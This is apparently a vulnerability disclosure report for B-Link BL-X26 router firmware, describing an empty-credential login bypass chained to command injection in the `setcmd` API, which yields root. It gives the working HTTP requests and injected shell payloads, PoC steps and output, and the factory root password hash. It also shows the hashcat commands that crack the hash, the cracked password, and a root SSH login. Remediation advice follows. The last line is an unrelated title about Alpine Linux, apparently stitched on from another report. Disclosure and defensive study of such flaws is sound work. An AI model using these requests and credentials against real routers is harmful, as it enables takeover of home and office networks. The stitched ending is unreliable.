**Entry point.** In `www/cgi-bin/lighttpd.cgi`, the JSON dispatch table maps `loginauth` → 0x128ac (`sym.bs_loginauth`) and `setcmd` → 0xfd94 (`sym.bs_SetCmd`). The CGI reads the POST body per `CONTENT_LENGTH`, parses JSON, and dispatches by `type`, so a `setcmd` request always enters `bs_SetCmd`.

**Injection sink.** `sym.bs_SetCmd` (`usr/lib/libblinkapi.so`, 0x0000fd94, 824 bytes, disassembly in `libblinkapi_bs_SetCmd.asm.txt`) takes the JSON `cmd` member and appends it via `imp.strcat` (import 0x00035290) into the command buffer with no filtering, then calls `imp.popen` (import 0x000350f0). Reconstructed pseudo-code:

```c
/* usr/lib/libblinkapi.so : sym.bs_SetCmd @ 0x0000fd94 */
int bs_SetCmd(json_object *root) {
    char cmd_buf[0x1c30];
    const char *arg = json_object_get_string(root, "cmd");  /* no filtering at all */
    strcpy(cmd_buf, cmd_prefix);   /* fixed server-side command prefix */
    strcat(cmd_buf, arg);          /* imp.strcat @ 0x00035290 — attacker string appended verbatim */
    fp = popen(cmd_buf, "r");      /* imp.popen @ 0x000350f0 — /bin/sh -c executes cmd_buf */
}
```

Runtime proof (strace, `vuln1-03-setcmd-strace.log`):

```text
[pid 170102] execve("/bin/sh", ["sh", "-c", "id > /tmp/pwn_st 2>&1"], 0x25b62ba0 /* 35 vars */ <unfinished ...>
[pid 170102] <... execve resumed>)      = 0
```

**Token check.** `check_auth` in `lighttpd.cgi` (0x00030e2c, disassembly in `cgi_check_auth.asm.txt`) opens `/tmp/token` with `fopen` and compares each line against the `AUTHORIZATION` environment variable; only on a match does it dispatch into the API table. The token is written by `bs_loginauth` to `/tmp/token` and returned to the client.

**Bypass root cause.** `sym.bs_loginauth` (0x000128ac) reads `routeusr`/`routepwd` from the `system` UCI section; the factory `/etc/config/system` has no `route` section, both lookups fail returning empty strings, and the empty username/empty password compare equal — login succeeds and a session token is issued.

**Cross-verification.** Submitting the same `setcmd` request without an `Authorization` header returns `{"result":8}` (rejected, no `popen` triggered); with the token issued by `bs_loginauth`, the same request returns `{"type":"setcmd","cmd":"id > /tmp/pwn_st 2>&1","cmdinfo":""}` and drops `uid=0(root)` on disk. Two distinct payloads (redirection, appended `uname`) both executed with `/bin/sh -c` semantics, confirming the chain is exactly "loginauth token + bs_SetCmd popen".

## Exploitation

### Preconditions

- Network reachability of the Blink management API (`/cgi-bin/lighttpd.cgi`); no credentials are needed — the device ships without an administrator account configured.
- The factory configuration state (no `config route` section) must be present, which is the default.

### Steps

1. (Offline verification path) Verify the upgrade zip SHA-256 `bf4ecdb6...ae690`, extract `X26(AC12)-V1.0.1-20231221-upgrade.bin` (SHA-256 `c480994e...f668e`), locate the squashfs partition at offset 2548141, and unsquashfs to obtain the rootfs; `cat ./rootfs/etc/FW-Version` prints `WR-V36-1200M-28A13E-D-AC12,1.0.1`.
2. Start the target: `bash ./run_emulation.sh` builds a chroot runtime (with qemu re-enter shims for guest `execve`) and starts the emulated management API at `http://127.0.0.1:8080/cgi-bin/lighttpd.cgi`, dispatching each request to the firmware's original CGI via `chroot ./emul /qemu-mipsel-static -cpu 74Kf /www/cgi-bin/lighttpd.cgi`.
3. Run `python3 ./poc.py`, which performs the two request steps below and verifies the result.

### HTTP requests

```http
POST /cgi-bin/lighttpd.cgi HTTP/1.1
Host: <router>
Content-Type: application/json

{"type": "loginauth", "platform": "0", "user": "", "pass": ""}
```

Response (empty credentials accepted):

```json
{"type":"loginauth","token":"db756d4147f6f47fc9fb71bbaba8024c","first_login":0,"defmode":"router","result":0}
```

```http
POST /cgi-bin/lighttpd.cgi HTTP/1.1
Host: <router>
Content-Type: application/json
Authorization: db756d4147f6f47fc9fb71bbaba8024c

{"type": "setcmd", "cmd": "id > /tmp/pwned_cnvd 2>&1; uname -a >> /tmp/pwned_cnvd 2>&1"}
```

Response: `{"type":"setcmd","cmd":"id > /tmp/pwned_cnvd 2>&1; uname -a >> /tmp/pwned_cnvd 2>&1","cmdinfo":""}` — and `/tmp/pwned_cnvd` then contains:

```text
uid=0(root) gid=0(root) groups=0(root),1000
Linux LAPTOP-PUJQJJ4Q 6.18.33.1-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC ... mips GNU/Linux
```

Final PoC verdict: `VERDICT SUCCESS`.

### Root weak-password confirmation

1. Extract the hash: `grep '^root' ./rootfs/etc/shadow` → `root:$1$ZvjIxpIk$O1X0HkvJuq4NEv5fDnsC5/`.
2. Crack offline (CPU/pocl backend in the sandbox requires `--force`):

```sh
cut -d: -f2 ./creds.hash > ./creds_hash_only.txt
hashcat -m 500 -a 0 --force --potfile-path=./hashcat.pot \
    ./creds_hash_only.txt ./hq.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
```

Result: `$1$ZvjIxpIk$O1X0HkvJuq4NEv5fDnsC5/:blinkadmin`, `Status: Cracked`.

3. Log in over SSH with the cracked plaintext (`dropbear -R` generates the host key on demand because the factory host-key files are empty):

```sh
chroot ./emul /qemu-mipsel-static -cpu 74Kf /usr/sbin/dropbear -R -p 127.0.0.1:2222 -F -E
python3 ./ssh_login_blinkadmin.py 2222
```

The session prints `uid=0(root) gid=0(root) groups=0(root),1000`, the kernel banner, and the firmware version; dropbear logs `Password auth succeeded for 'root'`.

## Evidence

![run_emulation.sh target startup: firmware SHA-256 verification, squashfs partition at offset 2548141, FW-Version WR-V36-1200M-28A13E-D-AC12,1.0.1, factory config, emulated management API listening on 127.0.0.1:8080](BLINKX26_images/fig1.png)

Target startup trace: the audited firmware image hash is verified, the SquashFS partition (offset 2548141) is unpacked, the in-firmware version `WR-V36-1200M-28A13E-D-AC12,1.0.1` and factory configuration (no admin account) are printed, and the emulated management API reports `[EMUL] Listening on http://127.0.0.1:8080/cgi-bin/lighttpd.cgi`.

![poc.py run: empty-credential loginauth returns result:0 with a session token, setcmd executes id/uname, output shows uid=0(root), VERDICT SUCCESS](BLINKX26_images/fig2.png)

PoC execution: the `loginauth` call with `user:"" pass:""` is accepted (`"result":0`) and issues a 32-hex token without any credential; the `setcmd` request carrying the token executes the injected `id`/`uname` commands; the dropped file contains `uid=0(root) gid=0(root) groups=0(root),1000` and the harness prints `VERDICT SUCCESS`.

![hashcat -m 500 cracking session and dropbear startup log showing Password auth succeeded for 'root'](BLINKX26_images/fig3.png)

Offline root password cracking: `hashcat -m 500` with the `rockyou-30000.rule` recovers `blinkadmin` from the shadow hash (all hashes found in potfile on re-run); the dropbear service started with `-R` generates its host key and logs `Password auth succeeded for 'root' from 127.0.0.1:47002`.

![SSH login as root/blinkadmin: uid=0(root) gid=0(root) groups=0(root),1000, kernel banner and firmware version WR-V36-1200M-28A13E-D-AC12,1.0.1](BLINKX26_images/fig4.png)

Credential-verification session: `ssh -p 2222 root@127.0.0.1` with the cracked password `blinkadmin` yields a root shell (`uid=0(root)`), the mips GNU/Linux banner, and the audited firmware version — confirming the weak root credential is actually usable for login.

## Impact

- Complete pre-authentication compromise: any attacker who can reach the management API executes arbitrary commands as **root** with zero credentials.
- Configuration theft/tampering, session-token harvesting, backdoor planting, and lateral movement into the LAN/WAN behind the router.
- Independently, the factory root account carries a trivially crackable password (`blinkadmin`), reused as a hardcoded backup-encryption key in `recover.cgi`, and dropbear ships with `RootPasswordAuth 'on'` — providing a fallback root-login path even after the API chain is patched.

## Remediation Suggestions

1. **Fix the authentication bypass (`bs_loginauth`):** after reading `routeusr`/`routepwd`, first check whether the lookup succeeded; when `easy_uci_get_option_string` fails or returns an empty string, treat it as "no valid administrator account" and return a login failure immediately — never compare against an empty-string password. Use constant-time password comparison, add backoff/lockout for repeated failures, and ship a complete `config route 'route'` section with a per-device randomly generated strong initial password that must be changed at first login.
2. **Fix the command injection (`sym.bs_SetCmd`, 0x0000fd94):** remove `popen()`/`system()` calls entirely and exec fixed programs via `execve()` with argv arrays (e.g. `argv = {"/bin/ping", "-c", "1", host, NULL}`). If shell usage is unavoidable, restrict `cmd` to a server-side command enumeration, validate each parameter with regex whitelists (hostname limited to `[A-Za-z0-9.-]{1,63}`), reject `; | & $ ( ) \`` metacharacters and newlines, cap command length, and use `strncat`/`snprintf` to avoid buffer overflows.
3. **Tighten the management interface:** reject every `type` except `loginauth` before `check_auth` passes; give session tokens an expiry and bind them to source IP/device; protect `/tmp/token` from non-privileged processes; listen on LAN only by default and disable WAN access; add CSRF checks and rate limiting; retire user-facing `setcmd`-style diagnostic endpoints in favor of fixed diagnostic action IDs mapped server-side to fixed commands.
4. **Fix the weak root password:** never ship an offline-crackable root password (blinkadmin falls to rockyou rules almost instantly); force a strong root password at first power-on; disable `RootPasswordAuth` in `/etc/config/dropbear` by default (SSH keys only); replace the hardcoded `blinkadmin` backup-encryption password in `recover.cgi` with per-device random keys.
5. **Engineering/regression testing:** add factory test cases asserting that `loginauth` returns non-zero when no administrator account is configured, and that `setcmd` payloads (`; id`, `| id`, `$(id)`, `` `id` ``) are rejected with no child process spawned; add compile-time warnings banning direct `popen`/`system` in management-plane code; re-release and confirm `poc.py` prints `VERDICT FAILED` against the fixed version.

## References

- Firmware download (as referenced in the audit package): <https://www.b-link.net.cn/download/BL-X26_AC12_OP(V1.0.1)%E5%8D%87%E7%BA%A7%E5%9B%BA%E4%BB%B6.html>

## Discoverer

Vulnerability discovered by **JiuZero**.

title: Alpine Linux alpine-virt 3.24.1: tiny-cloud NoCloud CIDATA Seed Volume Arbitrary Script Execution (Pre-Auth, Boot-time Root RCE)
